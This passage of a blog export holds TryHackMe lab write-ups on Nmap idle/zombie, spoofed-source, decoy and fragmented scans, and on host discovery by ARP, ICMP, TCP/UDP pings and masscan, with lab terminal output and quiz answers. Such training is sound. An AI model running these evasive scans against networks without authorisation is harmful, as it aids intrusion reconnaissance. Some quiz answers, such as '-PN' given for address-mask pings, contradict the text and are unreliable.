limitations, spoofing your IP address can have little use; however, we can give it an upgrade with the idle scan.\nThe idle scan, or zombie scan, requires an idle system connected to the network that you can communicate with. Practically, Nmap will make each probe appear as if coming from the idle (zombie) host, then it will check for indicators whether the idle (zombie) host received any response to the spoofed probe. This is accomplished by checking the IP identification (IP ID) value in the IP header. You can run an idle scan using nmap -sI ZOMBIE_IP MACHINE_IP, where ZOMBIE_IP is the IP address of the idle host (zombie).\nThe idle (zombie) scan requires the following three steps to discover whether a port is open:\nTrigger the idle host to respond so that you can record the current IP ID on the idle host.Send a SYN packet to a TCP port on the target. The packet should be spoofed to appear as if it was coming from the idle host (zombie) IP address.Trigger the idle machine again to respond so that you can compare the new IP ID with the one received earlier.Let’s explain with figures. In the figure below, we have the attacker system probing an idle machine, a multi-function printer. By sending a SYN&#x2F;ACK, it responds with an RST packet containing its newly incremented IP ID.\n\nThe attacker will send a SYN packet to the TCP port they want to check on the target machine in the next step. However, this packet will use the idle host (zombie) IP address as the source. Three scenarios would arise. In the first scenario, shown in the figure below, the TCP port is closed; therefore, the target machine responds to the idle host with an RST packet. The idle host does not respond; hence its IP ID is not incremented.\n\nIn the second scenario, as shown below, the TCP port is open, so the target machine responds with a SYN&#x2F;ACK to the idle host (zombie). The idle host responds to this unexpected packet with an RST packet, thus incrementing its IP ID.\n\nIn the third scenario, the target machine does not respond at all due to firewall rules. This lack of response will lead to the same result as with the closed port; the idle host won’t increase the IP ID.\nFor the final step, the attacker sends another SYN&#x2F;ACK to the idle host. The idle host responds with an RST packet, incrementing the IP ID by one again. The attacker needs to compare the IP ID of the RST packet received in the first step with the IP ID of the RST packet received in this third step. If the difference is 1, it means the port on the target machine was closed or filtered. However, if the difference is 2, it means that the port on the target was open.\nIt is worth repeating that this scan is called an idle scan because choosing an idle host is indispensable for the accuracy of the scan. If the “idle host” is busy, all the returned IP IDs would be useless.\nQuestions and answers of this task\nTASK 8 - Getting more dteailsYou might consider adding –reason if you want Nmap to provide more details regarding its reasoning and conclusions. Consider the two scans below to the system; however, the latter adds –reason.\nPentester Terminal\n12345678910111213141516pentester@TryHackMe$ sudo nmap -sS 10.10.252.27Starting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:39 BSTNmap scan report for ip-10-10-252-27.eu-west-1.compute.internal (10.10.252.27)Host is up (0.0020s latency).Not shown: 994 closed portsPORT    STATE SERVICE22/tcp  open  ssh25/tcp  open  smtp80/tcp  open  http110/tcp open  pop3111/tcp open  rpcbind143/tcp open  imapMAC Address: 02:45:BF:8A:2D:6B (Unknown)Nmap done: 1 IP address (1 host up) scanned in 1.60 seconds\nPentester Terminal\npentester@TryHackMe$ sudo nmap -sS --reason 10.10.252.2712345678910111213141516Starting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:40 BSTNmap scan report for ip-10-10-252-27.eu-west-1.compute.internal (10.10.252.27)Host is up, received arp-response (0.0020s latency).Not shown: 994 closed portsReason: 994 resetsPORT    STATE SERVICE REASON22/tcp  open  ssh     syn-ack ttl 6425/tcp  open  smtp    syn-ack ttl 6480/tcp  open  http    syn-ack ttl 64110/tcp open  pop3    syn-ack ttl 64111/tcp open  rpcbind syn-ack ttl 64143/tcp open  imap    syn-ack ttl 64MAC Address: 02:45:BF:8A:2D:6B (Unknown)Nmap done: 1 IP address (1 host up) scanned in 1.59 seconds\nProviding the –reason flag gives us the explicit reason why Nmap concluded that the system is up or a particular port is open. In this console output above, we can see that this system is considered online because Nmap “received arp-response.” On the other hand, we know that the SSH port is deemed to be open because Nmap received a “syn-ack” packet back.\nFor more detailed output, you can consider using -v for verbose output or -vv for even more verbosity.\nPentester Terminal12345678910111213141516171819202122232425262728293031323334pentester@TryHackMe$ sudo nmap -sS -vv 10.10.252.27Starting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:41 BSTInitiating ARP Ping Scan at 10:41Scanning 10.10.252.27 [1 port]Completed ARP Ping Scan at 10:41, 0.22s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 10:41Completed Parallel DNS resolution of 1 host. at 10:41, 0.00s elapsedInitiating SYN Stealth Scan at 10:41Scanning ip-10-10-252-27.eu-west-1.compute.internal (10.10.252.27) [1000 ports]Discovered open port 22/tcp on 10.10.252.27Discovered open port 25/tcp on 10.10.252.27Discovered open port 80/tcp on 10.10.252.27Discovered open port 110/tcp on 10.10.252.27Discovered open port 111/tcp on 10.10.252.27Discovered open port 143/tcp on 10.10.252.27Completed SYN Stealth Scan at 10:41, 1.25s elapsed (1000 total ports)Nmap scan report for ip-10-10-252-27.eu-west-1.compute.internal (10.10.252.27)Host is up, received arp-response (0.0019s latency).Scanned at 2021-08-30 10:41:02 BST for 1sNot shown: 994 closed portsReason: 994 resetsPORT    STATE SERVICE REASON22/tcp  open  ssh     syn-ack ttl 6425/tcp  open  smtp    syn-ack ttl 6480/tcp  open  http    syn-ack ttl 64110/tcp open  pop3    syn-ack ttl 64111/tcp open  rpcbind syn-ack ttl 64143/tcp open  imap    syn-ack ttl 64MAC Address: 02:45:BF:8A:2D:6B (Unknown)Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 1.59 seconds           Raw packets sent: 1002 (44.072KB) | Rcvd: 1002 (40.092KB)\nIf -vv does not satisfy your curiosity, you can use -d for debugging details or -dd for even more details. You can guarantee that using -d will create an output that extends beyond a single screen.\nQuestions and answers of this task\nSUMMARY\n\n\nPort Scan Type\nExample Command\n\n\n\nTCP Null Scan\nsudo nmap -sN 10.10.214.83\n\n\nTCP FIN Scan\nsudo nmap -sF 10.10.214.83\n\n\nTCP Xmas Scan\nsudo nmap -sX 10.10.214.83\n\n\nTCP Maimon Scan\nsudo nmap -sM 10.10.214.83\n\n\nTCP ACK Scan\nsudo nmap -sA 10.10.214.83\n\n\nTCP Window Scan\nsudo nmap -sW 10.10.214.83\n\n\nCustom TCP Scan\nsudo nmap –scanflags URGACKPSHRSTSYNFIN 10.10.214.83\n\n\nSpoofed Source IP\nsudo nmap -S SPOOFED_IP 10.10.214.83\n\n\nSpoofed MAC Address\n–spoof-mac SPOOFED_MAC\n\n\nDecoy Scan\nnmap -D DECOY_IP,ME 10.10.214.83\n\n\nIdle (Zombie) Scan\nsudo nmap -sI ZOMBIE_IP 10.10.214.83\n\n\nFragment IP data into 8 bytes\n-f\n\n\nFragment IP data into 16 bytes\n-ff\n\n\n\n\n\nOption\nPurpose\n\n\n\n–source-port PORT_NUM\nspecify source port number\n\n\n–data-length NUM\nappend random data to reach given length\n\n\nThese scan types rely on setting TCP flags in unexpected ways to prompt ports for a reply. Null, FIN, and Xmas scans provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports.\n\n\n\nOption\nPurpose\n\n\n\n–reason\nexplains how Nmap made its conclusion\n\n\n-v\nverbose\n\n\n-vv\nvery verbose\n\n\n-d\ndebugging\n\n\n-dd\nmore details for debugging\n\n\n\nThank You 💌Author: Satvik Shetty🧑‍💻See you again in another writeup\n","slug":"THM/NMAP/Nmap-Advanced-Port-Scans","date":"2024-05-16T15:27:44.000Z","categories_index":"cybersecurity,THM,NMAP","tags_index":"tryhackme,nmap,information-gathering","author_index":"Satvik"},{"id":"2bcf8d570917965c65fd2618756df225","title":"Live Host Discovery - NMAP","content":"IntroductionWe can find live hosts on a network by using any of the 3 scans that are named below:\n\nARP scan: This scan uses ARP requests to discover live hosts\nICMP scan: This scan uses ICMP requests to identify live hosts\nTCP&#x2F;UDP ping scan: This scan sends packets to TCP ports and UDP ports to determine live hosts.\n\nA Nmap scan usually goes through the steps shown in the figure below, although many are optional and depend on the command-line arguments you provide.\n\n\nTASK 2 - SUBNETWORKSA network segment is a group of computers connected using a shared medium. For instance, the medium can be the Ethernet switch or WiFi access point. In an IP network, a subnetwork is usually the equivalent of one or more network segments connected together and configured to use the same router. The network segment refers to a physical connection, while a subnetwork refers to a logical connection.\nIn the following network diagram, we have four network segments or subnetworks. Generally speaking, your system would be connected to one of these network segments&#x2F;subnetworks. A subnetwork, or simply a subnet, has its own IP address range and is connected to a more extensive network via a router. There might be a firewall enforcing security policies depending on each network.\n\nThe figure above shows two types of subnets:\n\nSubnets with /16, which means that the subnet mask can be written as 255.255.0.0. This subnet can have around 65 thousand hosts.\nSubnets with /24, which indicates that the subnet mask can be expressed as 255.255.255.0. This subnet can have around 250 hosts\n\nIf you are in Network A, you can use ARP only to discover the devices within that subnet (10.1.100.0&#x2F;24). Suppose you are connected to a subnet different from the subnet of the target system(s). In that case, all packets generated by your scanner will be routed via the default gateway (router) to reach the systems on another subnet; however, the ARP queries won’t be routed and hence cannot cross the subnet router. ARP is a link-layer protocol, and ARP packets are bound to their subnet.\nAnswer the questions below\nSend a packet with the following:\n\n\nFrom computer1\nTo computer1 (to indicate it is broadcast)\nPacket Type: “ARP Request”\nData: computer6 (because we are asking for computer6 MAC address using ARP Request)\n\nHow many devices can see the ARP Request?\nAnswer : 4\nDid computer6 receive the ARP Request? (Y&#x2F;N)Answer : N\nSend a packet with the following:\n\n\nFrom computer4\nTo computer4 (to indicate it is broadcast)\nPacket Type: “ARP Request”\nData: computer6 (because we are asking for computer6 MAC address using ARP Request)\n\nHow many devices can see the ARP Request?\nAnswer : 4\nDid computer6 reply to the ARP Request? (Y&#x2F;N)\nAnswer : Y\n\nTASK 3 - Enumerating TargetsWe mentioned the different techniques we can use for scanning in Task 1. Before we explain each in detail and put it into use against a live target, we need to specify the targets we want to scan. Generally speaking, you can provide a list, a range, or a subnet. Examples of target specification are:\n\nlist: MACHINE_IP scanme.nmap.org example.com will scan 3 IP addresses.\nrange: 10.11.12.15-20 will scan 6 IP addresses: 10.11.12.15, **10.11.12.16… and 10.11.12.20.\nsubnet: MACHINE_IP/30 will scan 4 IP addresses.\n\nYou can also provide a file as input for your list of targets, nmap -iL list_of_hosts.txt.\nIf you want to check the list of hosts that Nmap will scan, you can use nmap -sL TARGETS. This option will give you a detailed list of the hosts that Nmap will scan without scanning them; however, Nmap will attempt a reverse-DNS resolution on all the targets to obtain their names. Names might reveal various information to the pentester. (If you don’t want Nmap to the DNS server, you can add -n.)\nLaunch the AttackBox using the Start AttackBox button, open the terminal when the AttackBox is ready, and use Nmap to answer the following.\nQ1 . What is the first IP address Nmap would scan if you provided 10.10.12.13/29 as your target?\nAnswer :we can use the command nmap -sL 10.10.12.13/29 \n\nso the answer is10.10.12.8\n**Q2.**How many IP addresses will Nmap scan if you provide the following range 10.10.0-255.101-125? \nwe can use the command nmap -sL **10.10.0-255.101-125** \n\nTASK - 4 Discovering Live HostsLet’s revisit the TCP&#x2F;IP layers shown in the figure next. We will leverage the protocols to discover the live hosts. Starting from bottom to top, we can use:\n\nARP from Link Layer\nICMP from Network Layer\nTCP from Transport Layer\nUDP from Transport Layer\n\n\nBefore we discuss how scanners can use each in detail, we will briefly review these four protocols. ARP has one purpose: sending a frame to the broadcast address on the network segment and asking the computer with a specific IP address to respond by providing its MAC (hardware) address.\nICMP has many types. ICMP ping uses Type 8 (Echo) and Type 0 (Echo Reply).\nIf you want to ping a system on the same subnet, an ARP query should precede the ICMP Echo.\nAlthough TCP and UDP are transport layers, for network scanning purposes, a scanner can send a specially-crafted packet to common TCP or UDP ports to check whether the target will respond. This method is efficient, especially when ICMP Echo is blocked.\nIf you have closed the network simulator, click on the “View Site” button in Task 2 to display it again.\nAnswer the questions below\nSend a packet with the following:\n\nFrom computer1\nTo computer3\nPacket Type: “Ping Request”\n\nWhat is the type of packet that computer1 sent before the ping?\nAnswer: ARP REQUEST\nWhat is the type of packet that computer1 received before being able to send the ping?\nAnswer: ARP RESPONSE\nHow many computers responded to the ping request?\nAnswer: 1\nSend a packet with the following:\n\nFrom computer2\nTo computer5\nPacket Type: “Ping Request”\n\nWhat is the name of the first device that responded to the first ARP Request?\nAnswer: Router\nWhat is the name of the first device that responded to the second ARP Request?\nAnswer: Computer5\n\nTASK 5 - Nmap Host Discovery Using ARPHow would you know which hosts are up and running? It is essential to avoid wasting our time port-scanning an offline host or an IP address not in use. There are various ways to discover online hosts. When no host discovery options are provided, Nmap follows the following approaches to discover live hosts:\n\nWhen a privileged user tries to scan targets on a local network (Ethernet), Nmap uses ARP requests. A privileged user is root or a user who belongs to sudoers and can run sudo.\nWhen a privileged user tries to scan targets outside the local network, Nmap uses ICMP echo requests, TCP ACK (Acknowledge) to port 80, TCP SYN (Synchronize) to port 443, and ICMP timestamp request.\nWhen an unprivileged user tries to scan targets outside the local network, Nmap resorts to a TCP 3-way handshake by sending SYN packets to ports 80 and 443.\n\nNmap, by default, uses a ping scan to find live hosts, then proceeds to scan live hosts only. If you want to use Nmap to discover online hosts without port-scanning the live systems, you can issue nmap -sn TARGETS. Let’s dig deeper into the different techniques used.\nARP scan is possible only if you are on the same subnet as the target systems. On an Ethernet (802.3) and WiFi (802.11), you need to know the MAC address of any system before you can communicate with it. The MAC address is necessary for the link-layer header; the header contains the source MAC address and the destination MAC address among other fields. To get the MAC address, the OS sends an ARP query. A host that replies to ARP queries is up. The ARP query only works if the target is on the same subnet as yourself, i.e., on the same Ethernet&#x2F;WiFi. You should expect to see many ARP queries generated during a Nmap scan of a local network. If you want Nmap only to perform an ARP scan without port-scanning, you can use nmap -PR -sn TARGETS, where -PR indicates that you only want an ARP scan. The following example shows Nmap using ARP for host discovery without any port scanning. We run nmap -PR -sn MACHINE_IP/24 to discover all the live systems on the same subnet as our target machine.\nPentester Terminal\n1234567891011121314pentester@TryHackMe$ sudo nmap -PR -sn 10.10.210.6/24Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-02 07:12 BSTNmap scan report for ip-10-10-210-75.eu-west-1.compute.internal (10.10.210.75)Host is up (0.00013s latency).MAC Address: 02:83:75:3A:F2:89 (Unknown)Nmap scan report for ip-10-10-210-100.eu-west-1.compute.internal (10.10.210.100)Host is up (-0.100s latency).MAC Address: 02:63:D0:1B:2D:CD (Unknown)Nmap scan report for ip-10-10-210-165.eu-west-1.compute.internal (10.10.210.165)Host is up (0.00025s latency).MAC Address: 02:59:79:4F:17:B7 (Unknown)Nmap scan report for ip-10-10-210-6.eu-west-1.compute.internal (10.10.210.6)Host is up.Nmap done: 256 IP addresses (4 hosts up) scanned in 3.12 secondsIn this case, the AttackBox had the IP address 10.10.210.6, and it used ARP requests to discover the live hosts on the same subnet. ARP scan works, as shown in the figure below. Nmap sends ARP requests to all the target computers, and those online should send an ARP reply back.\n\nIf we look at the packets generated using a tool such as tcpdump or Wireshark, we will see network traffic similar to the figure below. In the figure below, Wireshark displays the source MAC address, destination MAC address, protocol, and query related to each ARP request. The source address is the MAC address of our AttackBox, while the destination is the broadcast address as we don’t know the MAC address of the target. However, we see the target’s IP address, which appears in the Info column. In the figure, we can see that we are requesting the MAC addresses of all the IP addresses on the subnet, starting with 10.10.210.1. The host with the IP address we are asking about will send an ARP reply with its MAC address, and that’s how we will know that it is online.\nTalking about ARP scans, we should mention a scanner built around ARP queries: arp-scan; it provides many options to customize your scan. Visit the arp-scan wiki for detailed information. One popular choice is arp-scan –localnet or simply arp-scan -l. This command will send ARP queries to all valid IP addresses on your local networks. Moreover, if your system has more than one interface and you are interested in discovering the live hosts on one of them, you can specify the interface using -I. For instance, sudo arp-scan -I eth0 -l will send ARP queries for all valid IP addresses on the eth0 interface.\nNote that arp-scan is not installed on the AttackBox; however, it can be installed using apt install arp-scan.\nIn the example below, we scanned the subnet of the AttackBox using arp-scan ATTACKBOX_IP&#x2F;24. Since we ran this scan at a time frame close to the previous one nmap -PR -sn ATTACKBOX_IP&#x2F;24, we obtained the same three live targets.\n123456789pentester@TryHackMe$ sudo arp-scan 10.10.210.6/24Interface: eth0, datalink type: EN10MB (Ethernet)WARNING: host part of 10.10.210.6/24 is non-zeroStarting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)10.10.210.75\t02:83:75:3a:f2:89\t(Unknown)10.10.210.100\t02:63:d0:1b:2d:cd\t(Unknown)10.10.210.165\t02:59:79:4F:17:B7\t(Unknown)4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9: 256 hosts scanned in 2.726 seconds (93.91 hosts/sec). 3 responded\nSimilarly, the command arp-scan will generate many ARP queries that we can see using tcpdump, Wireshark, or a similar tool. We can notice that the packet capture for arp-scan and nmap -PR -sn yield similar traffic patterns. Below is the Wireshark output.\n\nIf you have closed the network simulator, click on the “Visit Site” button in Task 2 to display it again.\nAnswer the questions below:\nWe will be sending broadcast ARP Requests packets with the following options:\n\nFrom computer1\nTo computer1 (to indicate it is broadcast)\nPacket Type: “ARP Request”\nData: try all the possible eight devices (other than computer1) in the network: computer2, computer3, computer4, computer5, computer6, switch1, switch2, and router.\n\nHow many devices are you able to discover using ARP requests?\n3\n\nTASK 6 - NMAP HOST DISCOVERY USING ICMPWe can ping every IP address on a target network and see who would respond to our ping (ICMP Type 8&#x2F;Echo) requests with a ping reply (ICMP Type 0). Simple, isn’t it? Although this would be the most straightforward approach, it is not always reliable. Many firewalls block ICMP echo; new versions of MS Windows are configured with a host firewall that blocks ICMP echo requests by default. Remember that an ARP query will precede the ICMP request if your target is on the same subnet.\nTo use ICMP echo request to discover live hosts, add the option -PE. (Remember to add -sn if you don’t want to follow that with a port scan.) As shown in the following figure, an ICMP echo scan works by sending an ICMP echo request and expects the target to reply with an ICMP echo reply if it is online.\n\nIn the example below, we scanned the target’s subnet using nmap -PE -sn MACHINE_IP/24. This scan will send ICMP echo packets to every IP address on the subnet. Again, we expect live hosts to reply; however, it is wise to remember that many firewalls block ICMP. The output below shows the result of scanning the virtual machine’s class C subnet using sudo nmap -PE -sn MACHINE_IP/24 from the AttackBox.\n12345678910111213141516171819202122232425262728**Pentester Terminal:**pentester@TryHackMe$ sudo nmap -PE -sn 10.10.68.220/24Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-02 10:16 BSTNmap scan report for ip-10-10-68-50.eu-west-1.compute.internal (10.10.68.50)Host is up (0.00017s latency).MAC Address: 02:95:36:71:5B:87 (Unknown)Nmap scan report for ip-10-10-68-52.eu-west-1.compute.internal (10.10.68.52)Host is up (0.00017s latency).MAC Address: 02:48:E8:BF:78:E7 (Unknown)Nmap scan report for ip-10-10-68-77.eu-west-1.compute.internal (10.10.68.77)Host is up (-0.100s latency).MAC Address: 02:0F:0A:1D:76:35 (Unknown)Nmap scan report for ip-10-10-68-110.eu-west-1.compute.internal (10.10.68.110)Host is up (-0.10s latency).MAC Address: 02:6B:50:E9:C2:91 (Unknown)Nmap scan report for ip-10-10-68-140.eu-west-1.compute.internal (10.10.68.140)Host is up (0.00021s latency).MAC Address: 02:58:59:63:0B:6B (Unknown)Nmap scan report for ip-10-10-68-142.eu-west-1.compute.internal (10.10.68.142)Host is up (0.00016s latency).MAC Address: 02:C6:41:51:0A:0F (Unknown)Nmap scan report for ip-10-10-68-220.eu-west-1.compute.internal (10.10.68.220)Host is up (0.00026s latency).MAC Address: 02:25:3F:DB:EE:0B (Unknown)Nmap scan report for ip-10-10-68-222.eu-west-1.compute.internal (10.10.68.222)Host is up (0.00025s latency).MAC Address: 02:28:B1:2E:B0:1B (Unknown)Nmap done: 256 IP addresses (8 hosts up) scanned in 2.11 seconds\n\nThe scan output shows that eight hosts are up; moreover, it shows their MAC addresses. Generally speaking, we don’t expect to learn the MAC addresses of the targets unless they are on the same subnet as our system. The output above indicates that Nmap didn’t need to send ICMP packets as it confirmed that these hosts are up based on the ARP responses it received.\nWe will repeat the scan above; however, this time, we will scan from a system that belongs to a different subnet. The results are similar but without the MAC addresses.\n12345678910111213141516171819Pentester Terminal pentester@TryHackMe$ sudo nmap -PE -sn 10.10.68.220/24Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 12:16 EESTNmap scan report for 10.10.68.50Host is up (0.12s latency).Nmap scan report for 10.10.68.52Host is up (0.12s latency).Nmap scan report for 10.10.68.77Host is up (0.11s latency).Nmap scan report for 10.10.68.110Host is up (0.11s latency).Nmap scan report for 10.10.68.140Host is up (0.11s latency).Nmap scan report for 10.10.68.142Host is up (0.11s latency).Nmap scan report for 10.10.68.220Host is up (0.11s latency).Nmap scan report for 10.10.68.222Host is up (0.11s latency).Nmap done: 256 IP addresses (8 hosts up) scanned in 8.26 second\n\nIf you look at the network packets using a tool like Wireshark, you will see something similar to the image below. You can see that we have one source IP address on a different subnet than that of the destination subnet, sending ICMP echo requests to all the IP addresses in the target subnet to see which one will reply.\n\nBecause ICMP echo requests tend to be blocked, you might also consider ICMP Timestamp or ICMP Address Mask requests to tell if a system is online. Nmap uses timestamp request (ICMP Type 13) and checks whether it will get a Timestamp reply (ICMP Type 14). Adding the -PP option tells Nmap to use ICMP timestamp requests. As shown in the figure below, you expect live hosts to reply.\n\nIn the following example, we run nmap -PP -sn MACHINE_IP/24 to discover the online computers on the target machine subnet.\nPentester Terminal\n12345678910111213141516171819pentester@TryHackMe$ sudo nmap -PP -sn 10.10.68.220/24Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 12:06 EESTNmap scan report for 10.10.68.50Host is up (0.13s latency).Nmap scan report for 10.10.68.52Host is up (0.25s latency).Nmap scan report for 10.10.68.77Host is up (0.14s latency).Nmap scan report for 10.10.68.110Host is up (0.14s latency).Nmap scan report for 10.10.68.140Host is up (0.15s latency).Nmap scan report for 10.10.68.209Host is up (0.14s latency).Nmap scan report for 10.10.68.220Host is up (0.14s latency).Nmap scan report for 10.10.68.222Host is up (0.14s latency).Nmap done: 256 IP addresses (8 hosts up) scanned in 10.93 seconds\n\nSimilar to the previous ICMP scan, this scan will send many ICMP timestamp requests to every valid IP address in the target subnet. In the Wireshark screenshot below, you can see one source IP address sending ICMP packets to every possible IP address to discover online hosts.\n\nSimilarly, Nmap uses address mask queries (ICMP Type 17) and checks whether it gets an address mask reply (ICMP Type 18). This scan can be enabled with the option -PM. As shown in the figure below, live hosts are expected to reply to ICMP address mask requests.\n\nIn an attempt to discover live hosts using ICMP address mask queries, we run the command nmap -PM -sn MACHINE_IP/24. Although, based on earlier scans, we know that at least eight hosts are up, this scan returned none. The reason is that the target system or a firewall on the route is blocking this type of ICMP packet. Therefore, it is essential to learn multiple approaches to achieve the same result. If one type of packet is being blocked, we can always choose another to discover the target network and services.\nPentester Terminal\n123pentester@TryHackMe$ sudo nmap -PM -sn 10.10.68.220/24Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 12:13 EESTNmap done: 256 IP addresses (0 hosts up) scanned in 52.17 seconds\n\n\nAlthough we didn’t get any reply and could not figure out which hosts are online, it is essential to note that this scan sent ICMP address mask requests to every valid IP address and waited for a reply. Each ICMP request was sent twice, as we can see in the screenshot below.\n\nAnswer the questions below\nWhat is the option required to tell Nmap to use ICMP Timestamp to discover live hosts?\nCorrect Answer : -pp\nWhat is the option required to tell Nmap to use ICMP Address Mask to discover live hosts?\nCorrect Answer : -PN\nWhat is the option required to tell Nmap to use ICMP Echo to discover live hosts?\nCorrect Answer : -PE\nTASK 7 - Nmap Host Discovery Using TCP and UDPTCP SYN Ping\nWe can send a packet with the SYN (Synchronize) flag set to a TCP port, 80 by default, and wait for a response. An open port should reply with a SYN&#x2F;ACK (Acknowledge); a closed port would result in an RST (Reset). In this case, we only check whether we will get any response to infer whether the host is up. The specific state of the port is not significant here. The figure below is a reminder of how a TCP 3-way handshake usually works.\n\nIf you want Nmap to use TCP SYN ping, you can do so via the option -PS followed by the port number, range, list, or a combination of them. For example, -PS21 will target port 21, while -PS21-25 will target ports 21, 22, 23, 24, and 25. Finally -PS80,443,8080 will target the three ports 80, 443, and 8080.\nPrivileged users (root and sudoers) can send TCP SYN packets and don’t need to complete the TCP 3-way handshake even if the port is open, as shown in the figure below. Unprivileged users have no choice but to complete the 3-way handshake if the port is open.\n\nWe will run nmap -PS -sn MACHINE_IP/24 to scan the target VM subnet. As we can see in the output below, we were able to discover five hosts.\nPentester Terminal\n123456789101112pentester@TryHackMe$ sudo nmap -PS -sn 10.10.68.220/24Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 13:45 EESTNmap scan report for 10.10.68.52Host is up (0.10s latency).Nmap scan report for 10.10.68.121Host is up (0.16s latency).Nmap scan report for 10.10.68.125Host is up (0.089s latency).Nmap scan report for 10.10.68.134Host is up (0.13s latency).Nmap scan report for 10.10.68.220Host is up (0.11s latency).Nmap done: 256 IP addresses (5 hosts up) scanned in 17.38 seconds\n\nLet’s take a closer look at what happened behind the scenes by looking at the network traffic on Wireshark in the figure below. Technically speaking, since we didn’t specify any TCP ports to use in the TCP ping scan, Nmap used common ports; in this case, it is TCP port 80. Any service listening on port 80 is expected to reply, indirectly indicating that the host is online.\n\nTCP ACK Ping\nAs you have guessed, this sends a packet with an ACK flag set. You must be running Nmap as a privileged user to be able to accomplish this. If you try it as an unprivileged user, Nmap will attempt a 3-way handshake.\nBy default, port 80 is used. The syntax is similar to TCP SYN ping. -PA should be followed by a port number, range, list, or a combination of them. For example, consider -PA21, -PA21-25 and -PA80,443,8080. If no port is specified, port 80 will be used.\nThe following figure shows that any TCP packet with an ACK flag should get a TCP packet back with an RST flag set. The target responds with the RST flag set because the TCP packet with the ACK flag is not part of any ongoing connection. The expected response is used to detect if the target host is up.\n\nIn this example, we run sudo nmap -PA -sn MACHINE_IP/24 to discover the online hosts on the target’s subnet. We can see that the TCP ACK ping scan detected five hosts as up.\nPentester Terminal\n123456789101112pentester@TryHackMe$ sudo nmap -PA -sn 10.10.68.220/24Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 13:46 EESTNmap scan report for 10.10.68.52Host is up (0.11s latency).Nmap scan report for 10.10.68.121Host is up (0.12s latency).Nmap scan report for 10.10.68.125Host is up (0.10s latency).Nmap scan report for 10.10.68.134Host is up (0.10s latency).Nmap scan report for 10.10.68.220Host is up (0.10s latency).Nmap done: 256 IP addresses (5 hosts up) scanned in 29.89 seconds\n\nIf we peek at the network traffic as shown in the figure below, we will discover many packets with the ACK flag set and sent to port 80 of the target systems. Nmap sends each packet twice. The systems that don’t respond are offline or inaccessible.\n\nUDP Ping\nFinally, we can use UDP to discover if the host is online. Contrary to TCP SYN ping, sending a UDP packet to an open port is not expected to lead to any reply. However, if we send a UDP packet to a closed UDP port, we expect to get an ICMP port unreachable packet; this indicates that the target system is up and available.\nIn the following figure, we see a UDP packet sent to an open UDP port and not triggering any response. However, sending a UDP packet to any closed UDP port can trigger a response indirectly indicating that the target is online.\n\n\nThe syntax to specify the ports is similar to that of TCP SYN ping and TCP ACK ping; Nmap uses -PU for UDP ping. In the following example, we use a UDP scan, and we discover five live hosts.\nPentester Terminal\n123456789101112pentester@TryHackMe$ sudo nmap -PU -sn 10.10.68.220/24Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 13:45 EESTNmap scan report for 10.10.68.52Host is up (0.10s latency).Nmap scan report for 10.10.68.121Host is up (0.10s latency).Nmap scan report for 10.10.68.125Host is up (0.14s latency).Nmap scan report for 10.10.68.134Host is up (0.096s latency).Nmap scan report for 10.10.68.220Host is up (0.11s latency).Nmap done: 256 IP addresses (5 hosts up) scanned in 9.20 second\nLet’s inspect the UDP packets generated. In the following Wireshark screenshot, we notice Nmap sending UDP packets to UDP ports that are most likely closed. The image below shows that Nmap uses an uncommon UDP port to trigger an ICMP destination unreachable (port unreachable) error.\n\nMasscan\nOn a side note, Masscan uses a similar approach to discover the available systems. However, to finish its network scan quickly, Masscan is quite aggressive with the rate of packets it generates. The syntax is quite similar: -p can be followed by a port number, list, or range. Consider the following examples:\n\nmasscan MACHINE_IP/24 -p443\nmasscan MACHINE_IP/24 -p80,443\nmasscan MACHINE_IP/24 -p22-25\nmasscan MACHINE_IP/24 ‐‐top-ports 100\n\nMasscan is not installed on the AttackBox; however, it can be installed using apt install masscan.\nAnswer the questions below\nWhich TCP ping scan does not require a privileged account?\nTCP SYN PING\nWhich TCP ping scan requires a privileged account?\nTCP ACK PING\nWhat option do you need to add to Nmap to run a TCP SYN ping scan on the telnet port?\n-ps23\nTASK 8 - USING REVERSE DNS LOOKUPNmap’s default behaviour is to use reverse-DNS online hosts. Because the hostnames can reveal a lot, this can be a helpful step. However, if you don’t want to send such DNS queries, you use -n to skip this step.\nBy default, Nmap will look up online hosts; however, you can use the option -R to query the DNS server even for offline hosts. If you want to use a specific DNS server, you can add the --dns-servers DNS_SERVER option.\nAnswer the questions below\nWe want Nmap to issue a reverse DNS lookup for all the possibles hosts on a subnet, hoping to get some insights from the names. What option should we add?\nCorrect Answer : -R\n\nSUMMARY OF THE ROOM\nYou have learned how ARP, ICMP, TCP, and UDP can detect live hosts by completing this room. Any response from a host is an indication that it is online. Below is a quick summary of the command-line options for Nmap that we have covered.\n\n\n\nScan Type\nExample Command\n\n\n\nARP Scan\nsudo nmap -PR -sn MACHINE_IP&#x2F;24\n\n\nICMP Echo Scan\nsudo nmap -PE -sn MACHINE_IP&#x2F;24\n\n\nICMP Timestamp Scan\nsudo nmap -PP -sn MACHINE_IP&#x2F;24\n\n\nICMP Address Mask Scan\nsudo nmap -PM -sn MACHINE_IP&#x2F;24\n\n\nTCP SYN Ping Scan\nsudo nmap -PS22,80,443 -sn MACHINE_IP&#x2F;30\n\n\nTCP ACK Ping Scan\nsudo nmap -PA22,80,443 -sn MACHINE_IP&#x2F;30\n\n\nUDP Ping Scan\nsudo nmap -PU53,161,162 -sn MACHINE_IP&#x2F;30\n\n\nRemember to add -sn if you are only interested in host discovery without port-scanning. Omitting -sn will let Nmap default to port-scanning the live hosts.\n\n\n\nOption\nPurpose\n\n\n\n-n\nno DNS lookup\n\n\n-R\nreverse-DNS lookup for all hosts\n\n\n-sn\nhost discovery only\n\n\nThank You 💌Author: Satvik Shetty🧑‍💻See you again in another 